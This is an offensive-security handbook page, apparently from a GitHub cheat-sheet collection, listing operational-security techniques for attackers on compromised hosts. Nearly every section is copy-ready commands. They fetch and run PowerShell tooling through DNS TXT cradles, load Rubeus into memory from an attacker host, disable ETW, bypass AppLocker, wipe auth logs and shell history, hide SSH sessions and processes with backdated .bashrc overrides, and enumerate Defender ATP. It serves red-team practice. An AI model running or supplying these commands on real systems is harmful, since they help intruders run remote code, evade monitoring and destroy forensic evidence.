# Operational Security

## Table of Contents

- [Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Avoid-Invoke-Expression-IEX-and-Invoke-WebRequest-IWR)
- [Bypassing Event Tracing for Windows (ETW)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Bypassing-Event-Tracing-for-Windows-ETW)
- [Clear Linux History](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Clear-Linux-History)
- [Hiding SSH Sessions](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Hiding-SSH-Sessions)
- [Logfile Cleaning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Logfile-Cleaning)
- [LOLBAS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#LOLBAS)
- [.NET Reflection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#NET-Reflection)
- [Process Hiding](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Process-Hiding)
- [ProxyChains](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#ProxyChains)
- [Save File Deletion](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Save-File-Deletion)
- [Sneaky Directory](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Sneaky-Directory)
- [Windows Advanced Threat Protection (ATP)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/operational_security.md#Windows-Advanced-Threat-Protection-ATP)

## Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)

Instead of using `IEX` and `IWR` within assessments, try this:

* Host a text record with the payload at one of the unburned domains

| Name | Type | Value | TTL |
| --- | --- | --- | --- |
| cradle1 | TXT | "IEX(New-Object Net.WebClient).DownloadString($URI)" | 3600 |

```c
C:\> powershell . (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"""";'(nslookup -q=txt cradle1.domain.example)[-1]';Get-Domain'
```

Example with `PowerSharpPack`.

```c
C:\> powershell
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"""";'(nslookup -q=txt cradle1.example.domain)[-1]';PowerSharpPack'
```

### Concatinate Payloads

```c
PS C:\> powershell . (-Join (Resolve-DnsName -Type txt https://<DOMAIN>).Strings)
```

## Bypassing Event Tracing for Windows (ETW)

```c
C:\> set COMPlus_ETWEnabled=0
```

## Clear Linux History

```c
* echo "" > /var/log/auth.log
* echo "" > ~/.bash_history
* rm ~/.bash_history
* history -c
* export HISTFILESIZE=0
* export HISTSIZE=0
* kill -9 $$
* ln /dev/null ~/.bash_history -sf
* ln -sf /dev/null ~/.bash_history && history -c && exit
```

## Hiding SSH Sessions

```c
$ ssh -o UserKnownHostsFile=/dev/null -T <USERNAME>@<RHOST> 'bash -i'
```

- It is not added to `/var/log/utmp`
- It won't appear in the output of `w` or `who` commands
- No `.profile` or `.bash_profile` modification needed

## Logfile Cleaning

```c
$ cd /dev/shm; grep -v '<RHOST>' /var/log/auth.log > <FILE>.log; cat <FILE>.log > /var/log/auth.log; rm -f <FILE>.log
```

Notice that this modification of the logfile is most likely to be spotted.

## LOLBAS

### AppLocker Bypass

`<FILE>.url`:

```c
[internetshortcut]
url=C:\Windows\system32\calc.exe
```

```c
C:\Windows\system32> rundll32 C:\Windows\system32\ieframe.dll,OpenURL C:\<FILE>.url
```

### Port Forwarding with netsh

```c
C:\> netsh interface portproxy add v4tov4 listenaddress=<RHOST> listenport=<RPORT> connectaddress=<LHOST> connectport=<LPORT>
```

## .NET Reflection

```c
PS C:\> $d = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
PS C:\> $a = [System.Reflection.Assembly]::Load($d)
PS C:\> [Rubeus.Program]::Main("-h".Split())
```

## Process Hiding

```c
$ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'top(){ command top "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'htop(){ command htop "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'procs(){ command procs "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'pgrep(){ command pgrep "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'pstree(){ command pstree "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
```

## ProxyChains

> https://github.com/haad/proxychains

```c
$ proxychains <APPLICATION>
```

### Configuration

```c
socks4 metasploit
socks5 ssh
```

## Save File Deletion

```c
$ shred -z <FILE>
```

Alternatively:

```c
$ FN=<FILE>; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```

## Sneaky Directory

```c
$ sudo mkdir -p /mnt/.../<DIRECTORY>
```

## Windows Advanced Threat Protection (ATP)

### Information

Process:
- MsSense.exe

Service:
- Display name: Windows Defender Advanced Threat Protection Service

Name:
- Sense

Registry:
- HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection

File Paths:
- C:\Program Files\Windows Defender Advanced Threat Protection\

### Check Registry

```c
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection /s
```

### Check Service

```c
C:\> sc query sense
PS C:\> Get-Service Sense
```

### Process

```c
C:\> tasklist | findstr /i mssense.exe
```
